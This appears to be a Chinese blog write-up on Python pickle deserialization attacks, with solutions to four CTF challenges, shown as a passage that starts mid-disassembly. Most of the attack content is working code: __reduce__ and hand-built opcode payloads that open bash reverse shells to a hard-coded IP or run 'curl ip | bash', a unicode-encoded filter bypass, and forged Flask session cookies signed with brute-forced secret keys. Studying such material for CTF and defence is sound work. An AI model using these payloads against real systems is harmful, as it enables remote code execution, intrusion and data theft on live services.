  &#x27;__main__ Test&#x27;   44: p        PUT        1   47: c        GLOBAL     &#x27;__builtin__ object&#x27;   67: p        PUT        2   70: N        NONE   71: t        TUPLE      (MARK at 28)   72: p    PUT        3   75: R    REDUCE   76: p    PUT        4   79: (    MARK   80: d        DICT       (MARK at 79)   81: p    PUT        5   84: V    UNICODE    &#x27;a&#x27;   87: p    PUT        6   90: I    INT        1   93: s    SETITEM   94: b    BUILD   95: .    STOPhighest protocol among opcodes = 0\n\n小结由于在反序列化的时候，这个对象要能在当前环境上下文中创建，所以在实际的利用过程中，那些默认加载的库、标准库（可被自动 import）就成了首选的类，比如 os，它有 system 方法。\n对于 Python 可以被 pickle&#x2F;unpickle 的对象以及其他一些注意事项,这里列出几点比较重要的:\n\n函数（内置函数或用户自定义函数）在被封存时，引用的是函数全名（这就是为什么 lambda 函数不可以被封存：所有的匿名函数都有同一个名字：&lt;lambda&gt;）。这意味着只有函数所在的模块名，与函数名会被封存，函数体及其属性不会被封存。因此，在解封的环境中，函数所属的模块必须是可以被导入的，而且模块必须包含这个函数被封存时的名称，否则会抛出异常\n\n类也只封存名称，所以在解封环境中也有和函数相同的限制。注意，类体及其数据不会被封存，只有实例数据会被封存，所以在下面的例子中类属性 attr 不会存在于解封后的环境中：\nimport pickleclass Foo:    attr = &#x27;A class attribute&#x27;picklestring = pickle.dumps(Foo)\n\n当实例解封时，它的 __init__() 方法通常不会被调用。其默认动作是：先创建一个未初始化的实例，然后还原其属性：\ndef save(obj):    return (obj.__class__, obj.__dict__)def load(cls, attributes):    obj = cls.__new__(cls)    obj.__dict__.update(attributes)    return obj\n\n攻击思路payload 的构造分为用魔术方法自动构造和手动构造(手搓 opcode)\n自动攻击首先,这样序列化攻击是达不到攻击目的的\nimport pickleimport osclass Test:    def __init__(self):        self.a = os.system(&#x27;whoami&#x27;);test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)\n\nos.system(&quot;whoami&quot;) 在 test = Test() 就会被执行完毕，所以这个可以说是自己日自己了。\n相关魔术方法上面提到过，解封的时候是有一个默认的赋值过程，既然是默认行为，往往是有办法自定义的。Python 提供了很多魔术方法（比如比较常见的 __reduce__），来改变这一默认行为。下面一起来看下这些魔术方法都是怎么用的（下面几个方法的介绍，内容大部分都是摘录自官方文档）。\n__getnewargs_ex__()\n限制：\n\n对于使用 v2 版或更高版协议的 pickle 才能使用此方法\n必须返回一对 (args, kwargs) 用于构建对象，其中 args 是表示位置参数的 tuple，而 kwargs 是表示命名参数的 dict\n\n__getnewargs_ex__() 方法 return 的值，会在解封时传给 __new__() 方法的作为它的参数\n\n\n__getnewargs__()限制：\n\n必须返回一个 tuple 类型的 args\n如果定义了 __getnewargs_ex__()，那么 __getnewargs__() 就不会被调用\n\n这个方法与上一个 __getnewargs_ex__() 方法类似，但只支持位置参数\n注：在 Python 3.6 前，v2、v3 版协议会调用 __getnewargs__()，更高版本协议会调用 __getnewargs_ex__()\n__setstate__在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。\n__reduce__构造方法，在反序列化的时候自动执行，类似于php中的__wakeup\n常用payload没有os模块import pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\n环境有os模块import pickleimport osimport base64class aaa():    def __reduce__(self):        return(os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))a = aaa()payload = pickle.dumps(a)payload = base64.b64encode(payload)print(payload)#注意payloads生成的shell脚本需要在目标机器操作系统上执行，否则会报错\n\n所以最好所有poc在linux上生成\n例题[HFCTF 2021 Final]easyflask上来提示&#x2F;file&#x3D;index.js\n\n存在任意文件读取,先读个环境变量\n\n这就有flag了?看来是非预期,注意到这里有个秘钥\nsecret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh\n\n再看看app&#x2F;source\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler():    if not session.get(&#x27;u&#x27;):        u = pickle.dumps(User())        session[&#x27;u&#x27;] = u    return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler():    path = request.args.get(&#x27;file&#x27;)    path = os.path.join(&#x27;static&#x27;, path)    if not os.path.exists(path) or os.path.isdir(path) \\            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:        return &#x27;disallowed&#x27;    with open(path, &#x27;r&#x27;) as fp:        content = fp.read()    return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)\n\n抓包看看cookie\n\n发现jwt,漏洞代码:\n@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;\n\n伪造session实现 读取 u 中的 b值,对b中的值进行反序列化,可以直接触发RCE\n对cookie数据签名:\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;payload&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n一会回来替换payload。\n在linux系统下运行以下代码\nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (os.system, (&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.122.131.175/2333 0&gt;&amp;1&quot;&#x27;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVUQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDZiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEyMi4xMzEuMTc1LzIzMzMgMD4mMSKUhZRSlC4=&quot;&quot;&quot;\n\n生成后替换payload,并伪造cookie\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmGQ.dppzM5WSDj4VyWzXfRsYX_7E6ng\n\n但是很奇怪,怎么都弹不了shell,改一下命令直接把flag带出来好了\nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /tmp/1&#x27;)&quot;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&quot;&quot;&quot;\n\n└─# flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n得到session\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmsA.TG8jihGGbB1fpMg_7MiZOtcsJnI\n\n然后去admin路由下改cookie\n\n然后访问\nhttp://85e89518-1277-4f43-b3b3-f147d35a58fe.node5.buuoj.cn:81/file?file=/tmp/1\n\n得到flag\n\nflag&#123;639e4746-17d1-49aa-9136-ad69a53d4faa&#125;\n\n[0xgame 2023 Notebook]环境找不到,不过从网上找到了源码\nfrom flask import Flask, request, render_template, sessionimport pickleimport uuidimport osapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()class Note(object):    def __init__(self, name, content):        self._name = name        self._content = content    @property    def name(self):        return self._name        @property    def content(self):        return self._content@app.route(&#x27;/&#x27;)def index():    return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/&lt;path:note_id&gt;&#x27;, methods=[&#x27;GET&#x27;])def view_note(note_id):    notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;note.html&#x27;, msg=&#x27;You have no notes&#x27;)        note_raw = notes.get(note_id)    if not note_raw:        return render_template(&#x27;note.html&#x27;, msg=&#x27;This note does not exist&#x27;)        note = pickle.loads(note_raw)    return render_template(&#x27;note.html&#x27;, note_id=note_id, note_name=note.name, note_content=note.content)@app.route(&#x27;/add_note&#x27;, methods=[&#x27;POST&#x27;])def add_note():    note_name = request.form.get(&#x27;note_name&#x27;)    note_content = request.form.get(&#x27;note_content&#x27;)    if note_name == &#x27;&#x27; or note_content == &#x27;&#x27;:        return render_template(&#x27;index.html&#x27;, status=&#x27;add_failed&#x27;, msg=&#x27;note name or content is empty&#x27;)        note_id = str(uuid.uuid4())    note = Note(note_name, note_content)    if not session.get(&#x27;notes&#x27;):        session[&#x27;notes&#x27;] = &#123;&#125;        notes = session[&#x27;notes&#x27;]    notes[note_id] = pickle.dumps(note)    session[&#x27;notes&#x27;] = notes    return render_template(&#x27;index.html&#x27;, status=&#x27;add_success&#x27;, note_id=note_id)@app.route(&#x27;/delete_note&#x27;, methods=[&#x27;POST&#x27;])def delete_note():    note_id = request.form.get(&#x27;note_id&#x27;)    if not note_id:        return render_template(&#x27;index.html&#x27;)        notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;You have no notes&#x27;)        if not notes.get(note_id):        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;This note does not exist&#x27;)        del notes[note_id]    session[&#x27;notes&#x27;] = notes    return render_template(&#x27;index.html&#x27;, status=&#x27;delete_success&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8000, debug=False)\n\n发现密钥非常弱,可以爆破出来.其次&#x2F;path:note_id路由下,pickle.loads 触发反序列化\n\n生成密钥爆破字典\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\n解码原来的session\nflask-unsign --decode --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot;\n\n输出:\n&#123;&#x27;notes&#x27;: &#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;: b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Note\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x05_name\\x94\\x8c\\x011\\x94\\x8c\\x08_content\\x94h\\x06ub.&#x27;&#125;&#125;\n\nvalue里是pickle序列化字符串,这样可以知道session的格式是什么\n\n爆破密钥\nflask-unsign --unsign --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\n​\t得到密钥f991\n\n生成payload\nimport pickleimport osimport base64class aaa():    def __reduce__(self):        return(os.system,(&#x27;curl ip/1 |bash&#x27;,))a = aaa()payload=pickle.dumps(a)print(payload)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&quot;&quot;&quot;\n\n伪造session\n根据上面提到的session格式,伪造session\n&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;\n\nflask-unsign --sign --cookie &quot;&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;&quot; --secret &quot;f991&quot;\n\n得到session\n.eJwtyk0LgjAYAOC_ErvvsL2rpdBBTURxRZki3XTqdIw6uL4U_3sEPednRre7bUfkzohvnHrNuw5DwwEzgApvCWkxrWXlUOBEgvN7qxq5SHlZcVDeXyD80n9KapiJX5EEMzVRYU1yzLVvdVMmY7w_QarDjxjYW0zhQ1wkSadYdVHSSzrk_fWcmYDt0LIsX5LELaA.aMJwgQ.0eQq7FtPDtVnOK5vI8uw-iWEcx8\n\n\n\n\n即可得到shell\n[HZNUCTF 2023 preliminary]pickleimport base64import picklefrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:        return f.read()@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])def readFile():    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)    with open(filename, &#x27;r&#x27;) as f:        return f.read()if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\n漏洞代码:\n@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;\n\n拼接一下os即可,用没有os的payload\nimport pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;curl 47.122.131.175/2 | bash&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\n直接弹shell\n\nNSSCTF&#123;379bf252-10f4-404b-be5f-173b80e7d8b2&#125;\n\n基于opcode绕过字节码过滤对于一些题会对传入的数据进行过滤\n例如\n1.if b&#39;R&#39; in code or b&#39;built&#39; in code or b&#39;setstate&#39; in code or b&#39;flag&#39; in code\n2.a = base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:\n这个时候考虑用用到opcode\n什么是opcode\nPython 的 opcode（operation code）是一组原始指令，用于在 Python 解释器中执行字节码。每个 opcode都是是一个标识符，代表一种特定的操作或指令。 在 Python 中，源代码首先被编译为字节码，然后由解释器逐条执行字节码指令。这些指令以 opcode 的形式存储在字节码对象中，并由Python 解释器按顺序解释和执行。\n每个 opcode 都有其特定的功能，用于执行不同的操作，例如变量加载、函数调用、数值运算、控制流程等。Python 提供了大量的 opcode，以支持各种操作和语言特性。\n\nINST i、OBJ o、REDUCE R 都可以调用一个 callable 对象\n如何编写辅助生成工具pker：https://github.com/eddieivan01/pker\n一般用于绕过 find_class 黑名单&#x2F;白名单限制\npker用法\n\nGLOBAL 对应opcode：b’c’ 获取module下的一个全局对象（没有import的也可以，比如下面的os）： GLOBAL(‘os’, ‘system’) 输入：module,instance(callable、module都是instance)\nINST 对应opcode：b’i’ 建立并入栈一个对象（可以执行一个函数）： INST(‘os’, ‘system’, ’ls’)输入：module,callable,para\nOBJ 对应opcode：b’o’ 建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））： OBJ(GLOBAL(‘os’, ‘system’), ’ls’) 输入：callable,para\nxxx(xx,…) 对应opcode：b’R’ 使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）\nli[0]&#x3D;321 或 globals_dic[’local_var’]&#x3D;‘hello’ 对应opcode：b’s’ 更新列表或字典的某项的值\nxx.attr&#x3D;123 对应opcode：b’b’ 对xx对象进行属性设置\nreturn 对应opcode：b’0’ 出栈（作为pickle.loads函数的返回值）： return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）\n\n对于做题而言会opache改写就行了\nINST i、OBJ o、REDUCE R 都可以调用一个 callable 对象\nRCE demo:R:b&#x27;&#x27;&#x27;cos\\nsystem\\n(S&#x27;whoami&#x27;\\ntR.&#x27;&#x27;&#x27;ib&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;\\nios\\nsystem\\n.&#x27;&#x27;&#x27;ob&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;whoami&#x27;\\no.&#x27;&#x27;&#x27;无R,i,o os可过b&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;calc&#x27;\\nos.&#x27;&#x27;&#x27;无R,i,o os 可过  + 关键词过滤b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\\nS&#x27;val1&#x27;\\ndS&#x27;vul&#x27;\\n(cos\\nsystem\\nVcalc\\nos.&#x27;&#x27;&#x27;V操作码是可以识别\\u (unicode编码绕过)特别是命令有特殊功能字符\n\n例题[MTCTF 2022]easypickleimport base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()@app.route(&#x27;/&#x27;)def hello_world():    if not session.get(&#x27;user&#x27;):        session[&#x27;user&#x27;] = &#x27;&#x27;.join(random.choices(&quot;admin&quot;, k=5))    return &#x27;Hello &#123;&#125;!&#x27;.format(session[&#x27;user&#x27;])@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8888)\n\n漏洞代码:\n@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;\n\n这题的密钥还是一个弱口令,可以爆破\n绕过R i o b过滤其实仔细观察代码，发现其实最终使用的反序列化数据并不是经过replace之后的a，而是从session中获得的\n所以实际上我们经过replace之后的os还是小写的\n我们可以使用pickle构造os.system去反弹shell\nimport base64opcode = b&quot;&quot;&quot;(cossystemV\\u0062\\u0061\\u0073\\u0068\\u0020\\u002d\\u0063\\u0020\\u0027\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0034\\u0037\\u002e\\u0031\\u0032\\u0032\\u002e\\u0031\\u0033\\u0031\\u002e\\u0031\\u0037\\u0035\\u002f\\u0032\\u0033\\u0033\\u0033\\u0020\\u0030\\u003e\\u0026\\u0031\\u0027os.&quot;&quot;&quot;print(base64.b64encode(opcode))&quot;&quot;&quot;b&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&quot;&quot;&quot;\n\n本来我们opcode实际应该写为这样的：\nopcode = b&quot;&quot;&quot;(cossystemS&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;os.&quot;&quot;&quot;\n\n但是由于i被过滤了，所以我们需要进行绕过，我们可以使用V指令，V指令可以识别Unicode编码\n这样就可以将反弹shell进行unicode编码绕过\n\n生成解密脚本\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\n解密原始session\nflask-unsign --decode --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot;\n\n\n\n爆破密钥\nflask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\n​\t找到密钥是95c9\n\n构造 payload\n构造类似的payload&#123;&#39;user&#39;:&#39;admin&#39;,&#39;ser_data&#39;:&#39;payload&#39;&#125;\n对替换后的 a 进行检查 R i o b 但是实际反序列化的是ser_data\n因此os中o可以存在，但是单独的o是被禁止的，因为os被替换成Os，但对后续ser_data不影响\n\n\n将前面的opcode base64一下\nb&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;\n\n\n伪造session如下:\n&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125;\n\nsession签名:\nflask-unsign --sign --cookie &#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125; --secret 95c9\n\n得到\n.eJyrViotTi1SslJKTMnNzFPSUQLy4lMSSxKBQt7ufmXJ5QVVqRF-BlHhBt5hORWGvi6ORr4wOgxMG_saQvj-bmC60hdKR7lB1RmiivsZEqfPPwxFvCoKyvfLQVMPdY8fVJ8f1F0wdVB5Yz9U9xij6a-CyldB3VcJta_KF0bnoNCY8oYofAx5qLlVfmGo9sLNNcRKw_2PIxzg9vmVF5QlV5p4K9UCAPj_lEc.aMK5Ig.iWElfcilB7JypeNTDXdbahkQpzo\n\n改cookie,弹shell\n\n\n\nNSSCTF&#123;5b06a3c8-2698-438e-9672-7eb32edefa53&#125;\n","categories":["python,pickle"],"tags":["python,pickle,反序列化"]}]